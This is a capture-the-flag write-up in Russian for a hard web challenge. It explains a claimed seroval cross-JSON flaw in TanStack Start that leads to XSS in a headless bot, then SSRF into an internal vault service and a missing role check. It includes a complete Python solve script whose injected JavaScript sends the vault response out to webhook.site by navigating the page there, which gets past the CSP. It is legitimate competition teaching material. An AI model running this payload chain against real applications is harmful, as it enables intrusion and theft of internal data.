---
title: "Шах и мат"
ctf: "SolarCTF 2026"
date: 2026-10-18
category: web
difficulty: hard
points: null
flag_format: "SOLARCTF{...}"
author: "opencode"
---

# Шах и мат

## Summary

TanStack Start приложение уязвимо к **CVE‑2026‑102989** (seroval cross‑JSON): вызов
`/_serverFn/<id>` без заголовка `x-tsr-serverFn` возвращает «развёрнутый» результат,
что позволяет подделать HTML‑ответ и получить XSS в headless‑боте. Бот сидит во
внутренней сети рядом с хранилищем `vault:4000`; через него делаем SSRF и забираем флаг
из `GET /operator/export`, которому достаточно **любого** `?session=<id>` (роль не
проверяется), а валидный id бесплатно отдаёт сам WebSocket `vault:4000/feed`.

## Solution

### Step 1: XSS в бота через seroval‑CVE, эксфильтрация только навигацией

`POST /api/report {"url":"/..."}` отправляет headless‑браузер‑бота (внутренний origin
`http://localhost:3000`) на указанный путь. Вызов server‑function `FN_CARD`
(`022f3f…`) с seroval‑payload, где `result.response` — поддельный ответ
`content-type: text/html` с телом `<script>…</script>`, заставляет бот выполнить наш JS.

Критическая тонкость окружения: **CSP `connect-src` разрешает только внутренние хосты**.
Значит `fetch`/`Image`/WebSocket на внешний `webhook.site` блокируются (из‑за этого
«слепые» пейлоады молчат), но `ws://vault:4000` и `http://vault:4000` — разрешены.
Единственный канал наружу — **top‑level навигация** `location.href='https://webhook.site/…'`
(она не регулируется `connect-src`).

### Step 2: SSRF в vault + reader‑сессия → флаг

Любая висящая сетевая активность мешает `networkidle`, поэтому страница живёт ~2с до
goto‑timeout; успевают только событийные колбэки. Приём: `fetch` ответа vault в
переменную + `WebSocket('ws://vault:4000/feed')` как keepalive, а навигацию на вебхук
дёргаем по 3‑му WS‑сообщению (heartbeat ~2с), неся тело ответа.

WS при коннекте шлёт `{"type":"session","session":"46828b33950b474cd42b4940b77f625b","role":"reader"}`.
`GET /operator/export` без параметров даёт `403 operator session required`, но проверяет
лишь **наличие** `?session=<id>`, а не роль — reader‑сессии достаточно.

Один полный скрипт от нуля до флага:

```python
#!/usr/bin/env python3
# Шах и мат — solve: seroval-CVE XSS -> bot SSRF into vault -> /operator/export
import json, time, urllib.request, urllib.parse

BASE = "https://check-and-mate.solarctf.ru"
FN   = "022f3f5fe77ea6b61fa0a3463c3d13a7f72e451d156d396f3cf186af208a7e42"  # FN_CARD
SID  = "46828b33950b474cd42b4940b77f625b"  # reader session, см. ниже (vault /feed)

def jget(url, data=None, method="GET", headers=None):
    req = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    with urllib.request.urlopen(req, timeout=30) as r:
        return r.read().decode("utf-8", "replace")

# 0) свежий приёмник эксфильтрации (навигация попадёт сюда)
TOK = json.loads(jget("https://webhook.site/token", data=b"{}", method="POST",
                       headers={"content-type": "application/json"}))["uuid"]

# 1) JS бота: читаем vault по SSRF, держим страницу живой WS, навигация по 3-му heartbeat
TARGET = f"http://vault:4000/operator/export?session={SID}"
JS = (f"var W='https://webhook.site/{TOK}/F?d=';var res='PENDING',snt=0,m=0;"
      "function g(){if(snt)return;snt=1;location.href=W+encodeURIComponent(res.slice(0,6000))}"
      f"fetch('{TARGET}').then(function(r){{return r.text().then(function(t){{res='H'+r.status+' '+t}})}})"
      ".catch(function(e){res='CATCH '+e});"
      "var w=new WebSocket('ws://vault:4000/feed');"
      "w.onmessage=function(e){m++;if(m>=3)g()};w.onerror=function(){};"
      "setTimeout(g,3500);")

# 2) seroval cross-JSON: поддельный text/html ответ с нашим <script> (CVE-2026-102989)
body = "<!doctype html><meta charset=utf-8><script>" + JS + "</script>"
s = body.replace("<", "\\x3C")  # seroval-экранирование '<'
tree = {"t":10,"i":0,"p":{"k":["result"],"v":[
        {"t":10,"i":1,"p":{"k":["response"],"v":[
          {"t":10,"i":2,"p":{"k":["status","headers","body"],"v":[
            {"t":0,"s":200},
            {"t":10,"i":3,"p":{"k":["content-type"],
             "v":[{"t":1,"s":"text/html; charset=utf-8"}]},"o":0},
            {"t":1,"s":s}]},"o":0}]},"o":0}]},"o":0}
payload = json.dumps({"t": tree, "f": 127, "m": []}, separators=(",", ":"), ensure_ascii=False)
path = "/_serverFn/" + FN + "?payload=" + urllib.parse.quote(payload, safe="")

# 3) отправляем боту и ждём навигационный хит с телом ответа vault
jget(BASE + "/api/report", data=json.dumps({"url": path}).encode(),
     method="POST", headers={"content-type": "application/json"})
time.sleep(10)
reqs = json.loads(jget(f"https://webhook.site/token/{TOK}/requests?sorting=newest"))["data"]
for h in reqs:
    d = urllib.parse.unquote((h.get("query") or {}).get("d", ""))
    if "flag" in d:
        print(d); break
# -> H200 {"flag":"SOLARCTF{v4ult_0f_th3_b0ard}"}
```

Валидный `session` для шага выше достаётся бесплатно тем же приёмом — навигация по 2‑му
WS‑сообщению `ws://vault:4000/feed` возвращает
`{"type":"session","session":"46828b33950b474cd42b4940b77f625b","role":"reader"}`.

## Flag

```
SOLARCTF{v4ult_0f_th3_b0ard}
```
